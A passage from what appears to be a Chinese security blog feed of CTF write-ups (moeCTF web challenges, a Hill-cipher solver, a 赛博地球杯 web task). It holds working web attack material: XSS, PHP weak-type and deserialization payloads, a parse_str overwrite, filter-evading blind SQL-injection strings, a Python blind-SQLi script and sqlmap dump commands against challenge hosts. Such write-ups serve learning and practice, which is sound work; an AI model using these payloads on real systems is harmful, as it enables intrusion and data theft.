class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Ma=[</span><br><span class="line">    <span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,</span><br><span class="line">    <span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>,</span><br><span class="line">    <span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span></span><br><span class="line">   ]</span><br><span class="line">code=[</span><br><span class="line">      <span class="number">23</span>,<span class="number">10</span>,<span class="number">12</span>,</span><br><span class="line">      <span class="number">24</span>,<span class="number">16</span>,<span class="number">2</span>,</span><br><span class="line">      <span class="number">25</span>,<span class="number">3</span>,<span class="number">9</span>,</span><br><span class="line">      <span class="number">0</span>,<span class="number">9</span>,<span class="number">5</span></span><br><span class="line">     ]</span><br><span class="line">answer=[]</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">12</span>,<span class="number">3</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">99</span>,<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((<span class="number">1</span>*i + <span class="number">4</span>*j + <span class="number">7</span>*k)%<span class="number">26</span> == code[t]  <span class="keyword">and</span></span><br><span class="line">                    (<span class="number">2</span>*i + <span class="number">5</span>*j + <span class="number">8</span>*k)%<span class="number">26</span> ==  code[t+<span class="number">1</span>] <span class="keyword">and</span></span><br><span class="line">                     (<span class="number">3</span>*i + <span class="number">6</span>*j + <span class="number">10</span>*k)%<span class="number">26</span> == code[t+<span class="number">2</span>]):</span><br><span class="line">                    answer.append(i)</span><br><span class="line">                    answer.append(j)</span><br><span class="line">                    answer.append(k)</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span>(flag):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">print</span> (answer)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">print</span> (chr(i + <span class="number">97</span>),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p><p>其中Ma是加密矩阵的逆矩阵，code是密文各字母对应的数字编码</p><p>比赛陆陆续续开始多起来了，好好加油吧！<br>菜就是原罪！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2019/04/01/嘉韦斯杯Writeup/1.jpg&quot;&gt;
&lt;h1 id=&quot;壹&quot;&gt;&lt;a href=&quot;#壹&quot; class=&quot;headerlink&quot; title=&quot;壹&quot;&gt;&lt;/a&gt;壹&lt;/h1&gt;&lt;p&gt;一道SQL注入题，直接上sqlmap跑&lt;br&gt;&lt;img src=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://www.cryscat.com/tags/Writeup/"/>
    
      <category term="嘉韦斯" scheme="http://www.cryscat.com/tags/%E5%98%89%E9%9F%A6%E6%96%AF/"/>
    
      <category term="华东师范大学" scheme="http://www.cryscat.com/tags/%E5%8D%8E%E4%B8%9C%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>西北大学moeCTF-Web</title>
    <link href="http://www.cryscat.com/2019/03/10/%E8%A5%BF%E5%8C%97%E5%A4%A7%E5%AD%A6moeCTF-Web/"/>
    <id>http://www.cryscat.com/2019/03/10/西北大学moeCTF-Web/</id>
    <published>2019-03-10T12:10:14.000Z</published>
    <updated>2019-09-01T07:34:41.463Z</updated>
    
    <content type="html"><![CDATA[<img src="/2019/03/10/西北大学moeCTF-Web/1.jpg"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好久之前找到的一个CTF平台，今天偶然翻了出来，web部分还剩几道题，顺便刷掉吧……</p><h1 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h1><p>很明显是robots协议</p><blockquote><p><a href="http://47.93.187.174/nwuctf/robots.txt" target="_blank" rel="noopener">http://47.93.187.174/nwuctf/robots.txt</a></p></blockquote><img src="/2019/03/10/西北大学moeCTF-Web/2.jpg"><p>直接访问此文件得到flag</p><blockquote><p>nwuctf{robots_is_NOT_RobotQAQ}</p></blockquote><h1 id="让我们来弹一个flag"><a href="#让我们来弹一个flag" class="headerlink" title="让我们来弹一个flag"></a>让我们来弹一个flag</h1><p>根据题目意思，那就弹一个flag，在输入框输入<code>&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;</code>得到flag<br><img src="/2019/03/10/西北大学moeCTF-Web/3.jpg"></p><h1 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h1><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;/?php</span><br><span class="line">$s = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$a = <span class="string">'QNKCDZO'</span>;</span><br><span class="line">$md5a = md5($a);</span><br><span class="line">$md5s = md5($s);</span><br><span class="line"><span class="keyword">if</span>($s != $a &amp;&amp; $md5a == $md5s)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET方式给s赋一个值，使s不等于a且s的md5值等于a的md5值,这里的<code>==</code>弱类型比较只会比较变量的内容并不会比较变量类型。题中所给的<code>$a</code>的MD5值是0e开头的，这就导致php将它解析为科学计数法，所以我们只需再找一个MD5加密以0e开头的字符串即可<br>payload:</p><blockquote><p>?s=s878926199a</p></blockquote><h1 id="An-easy-SQLi-2"><a href="#An-easy-SQLi-2" class="headerlink" title="An easy SQLi 2"></a>An easy SQLi 2</h1><p>万能密码username:<code>&#39;or 1=1</code>，密码随便输，出flag</p><h1 id="头啊头哇"><a href="#头啊头哇" class="headerlink" title="头啊头哇"></a>头啊头哇</h1><p>首先赋值get=flag，然后会提示“必须使用IceRabbit浏览器”，改代理为<code>IceRabbit Browser</code>,接着会提示“你从google来吗？”，改Referer为<code>www.google.com</code>getflag<br><img src="/2019/03/10/西北大学moeCTF-Web/4.jpg"></p><h1 id="唯快不破"><a href="#唯快不破" class="headerlink" title="唯快不破?"></a>唯快不破?</h1><p>打开链接可以看到网页进行了多次跳转，利用python抓取页面就行了，将三个页面信息拼接得到flag<br><img src="/2019/03/10/西北大学moeCTF-Web/5.jpg"></p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>主页给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="string">"concat string"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">str</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get_flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tql, 缁欏笀鍌呴€抐lag:"</span>.<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造pop链，flag可以通过str类的 <code>__ toString</code>方法输出。该方法会在类被当做字符串的时候自动调用，所以自然而然想到利用hack类中的<code>__destruct</code></p><p>payload代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">str</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> get_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get_flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tql, 缁欏笀鍌呴€抐lag:"</span>.<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> hack;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><blockquote><p>string=O:4:%22hack%22:1:{s:4:%22mod1%22;O:3:%22str%22:1:{s:4:%22str1%22;O:8:%22get_flag%22:0:{}}}</p></blockquote><h1 id="如果还有如果"><a href="#如果还有如果" class="headerlink" title="如果还有如果"></a>如果还有如果</h1><p>题目给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'QUERY_STRING'</span>])) &#123;</span><br><span class="line">    $query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">    $res = parse_str($query);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'action'</span>]))&#123;</span><br><span class="line">        $action = $res[<span class="string">'action'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'auth'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        $user = $res[<span class="string">'user'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">        $pass = $res[<span class="string">'pass'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($user) &amp;&amp; !<span class="keyword">empty</span>($pass)) &#123;</span><br><span class="line">        $hashed_password = hash(<span class="string">'md5'</span>, $user.$pass);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($hashed_password) &amp;&amp; $hashed_password === <span class="string">'22180f07c8d8de04667257a18d9a64c6'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail :('</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用parse_str函数覆盖变量hashed_password的值</p><p>payload:</p><blockquote><p>action=auth&amp;hashed_password=22180f07c8d8de04667257a18d9a64c6</p></blockquote><h1 id="An-easy-SQLi"><a href="#An-easy-SQLi" class="headerlink" title="An easy SQLi"></a>An easy SQLi</h1><p>挺简单的，直接上sqlmap跑<br><img src="/2019/03/10/西北大学moeCTF-Web/6.jpg"></p><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><p>sqlmap不是万能的╥﹏╥，只能靠自己手动注入了，简单测试了一下拦截了以下关键词<code>order</code> | <code>left</code> | <code>mid</code> | <code>substr</code> | <code>like</code> | <code>=</code> | <code>%23(#)</code>|<code>ascii</code><br>那就用<code>right</code>|<code>regexp</code>|<code>--+</code>进行注入吧~<br>利用BP抓包并爆破?部分，突然发现MySQL不区分大小写？？？WTF！<br>一路走来爆到不明大小写的库名、表名、列名、字段，很崩溃！因为过滤掉了<code>ascii</code>和<code>ord</code>，在网上也没找到什么有用的相关资料，于是直接去找出题人聊了聊。他说这大小写并不是自己想要考察的点，只是无奈之下的一个非预期效果……好吧 Orz。然后他甩给我一个<a href="https://blog.csdn.net/z69183787/article/details/51321331" target="_blank" rel="noopener">链接</a>。只要加入关键词binary就行了。</p><ul><li><p>爆库</p><blockquote><p>id=1’ and right(database(),1) regexp binary ‘§?§’ –+</p></blockquote></li><li><p>爆表</p><blockquote><p>id=1’ and right((select group_concat(table_name) from information_schema.tables where table_schema regexp “ctf”),1) regexp binary ‘§?§’ –+</p></blockquote></li><li><p>爆列</p><blockquote><p>id=1’ and right((select group_concat(column_name) from information_schema.columns where table_name regexp “fla49”),1) regexp ‘§?§’ –+</p></blockquote></li><li><p>爆段的最后一步</p><blockquote><p>id=1’ and right((select group_concat(flag) from fla49),29) regexp binary ‘§?§wuctf{Her3_is_SQLi_FlaggQWQ}’ –+</p></blockquote></li></ul><p>当然也可以用脚本跑<br>下面附上我写的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">dic = <span class="string">'_&#123;&#125;-+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Database</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> db_name</span><br><span class="line">db_name = <span class="string">''</span></span><br><span class="line">flag1 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">url1 = <span class="string">'http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\' and right(database(),'</span>+str(i)+<span class="string">') regexp binary \''</span>+j+db_name+<span class="string">'\' --+'</span></span><br><span class="line"><span class="comment">#print(url1)</span></span><br><span class="line">res1 = r.get(url1)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hello'</span> <span class="keyword">in</span> res1.text:</span><br><span class="line">db_name = j+db_name</span><br><span class="line">print(db_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> j == <span class="string">'9'</span>:</span><br><span class="line">flag1 = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag1 == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'Database --&gt; '</span>+db_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Table</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> ta_name</span><br><span class="line">ta_name = <span class="string">''</span></span><br><span class="line">flag2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">url2 = <span class="string">'http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\' and right((select group_concat(table_name) from information_schema.tables where table_schema regexp "'</span>+db_name+<span class="string">'"),'</span>+str(i)+<span class="string">') regexp binary \''</span>+j+ta_name+<span class="string">'\' --+'</span></span><br><span class="line"><span class="comment">#print(url2)</span></span><br><span class="line">res2 = r.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hello'</span> <span class="keyword">in</span> res2.text:</span><br><span class="line">ta_name = j+ta_name</span><br><span class="line">print(ta_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> j == <span class="string">'9'</span>:</span><br><span class="line">flag2 = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag2 == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'Table_name --&gt; '</span>+ta_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Column</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> co_name</span><br><span class="line">co_name = <span class="string">''</span></span><br><span class="line">flag3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">url3 = <span class="string">'http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\' and right((select group_concat(column_name) from information_schema.columns where table_name regexp "'</span>+ta_name+<span class="string">'"),'</span>+str(i)+<span class="string">') regexp \''</span>+j+co_name+<span class="string">'\' --+'</span></span><br><span class="line"><span class="comment">#print(url3)</span></span><br><span class="line">res3 = r.get(url3)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hello'</span> <span class="keyword">in</span> res3.text:</span><br><span class="line">co_name = j+co_name</span><br><span class="line">print(co_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> j == <span class="string">'9'</span>:</span><br><span class="line">flag3 =<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag3 == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'Column_name --&gt; '</span>+co_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Flag</span><span class="params">()</span>:</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag4 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">url4 = <span class="string">'http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\' and right((select group_concat('</span>+co_name+<span class="string">') from '</span>+ta_name+<span class="string">'),'</span>+str(i)+<span class="string">') regexp binary \''</span>+j+flag+<span class="string">'\' --+'</span></span><br><span class="line"><span class="comment">#print(url4)</span></span><br><span class="line">res4 = r.get(url4)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hello'</span> <span class="keyword">in</span> res4.text:</span><br><span class="line">flag = j+flag</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> j == <span class="string">'9'</span>:</span><br><span class="line">flag4 = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag4 == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'flag --&gt; '</span>+flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">Database()</span><br><span class="line">Table()</span><br><span class="line">Column()</span><br><span class="line">Flag()</span><br></pre></td></tr></table></figure></p><img src="/2019/03/10/西北大学moeCTF-Web/7.jpg"><p>被SQL玩的团团转。。。卒</p><img src="/2019/03/10/西北大学moeCTF-Web/8.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2019/03/10/西北大学moeCTF-Web/1.jpg&quot;&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;好久之前找到的一个CTF平台，今天偶然翻了出来，w
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://www.cryscat.com/tags/Writeup/"/>
    
      <category term="Web" scheme="http://www.cryscat.com/tags/Web/"/>
    
      <category term="moeCTF" scheme="http://www.cryscat.com/tags/moeCTF/"/>
    
  </entry>
  
  <entry>
    <title>赛博地球杯网安大赛web部分Writeup</title>
    <link href="http://www.cryscat.com/2019/03/03/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9Bweb%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://www.cryscat.com/2019/03/03/赛博地球杯网安大赛web部分Writeup/</id>
    <published>2019-03-03T09:44:35.000Z</published>
    <updated>2019-03-05T15:48:10.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/1.jpg" title="Hello!"><h1 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h1><p>菜却坚强……</p><h1 id="0X01-大量设备报表不见了"><a href="#0X01-大量设备报表不见了" class="headerlink" title="0X01 大量设备报表不见了"></a>0X01 大量设备报表不见了</h1><p>脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/2.jpg"><br>爆破id试试<br><img src="/2019/03/03/赛博地球杯网安大赛web部分Writeup/3.jpg"><br>id=2333时爆出flag</p><h1 id="0X02-工控管理系统新版本"><a href="#0X02-工控管理系统新版本" class="headerlink" title="0X02 工控管理系统新版本"></a>0X02 工控管理系统新版本</h1><p>大致浏览一下有login.php，regist.php，findpwd.php这三个页面<br>在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了</p><p>爆数据库名：cetc004</p><blockquote><p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” –dbs</p></blockquote><p>爆表名：user</p><blockquote><p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 –tables</p></blockquote><p>爆列名：answer,password,question,username</p><blockquote><p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 -T user –columns</p></blockquote><p>爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来</p><blockquote><p>sqlmap -u <a href="http://111.198.29.45:32509/findpwd.php" target="_blank" rel="noopener">http://111.198.29.45:32509/findpwd.php</a> –data “username=1” -D cetc004 -T user -C “answer,password,question,username” –dump</p></blockquote><img 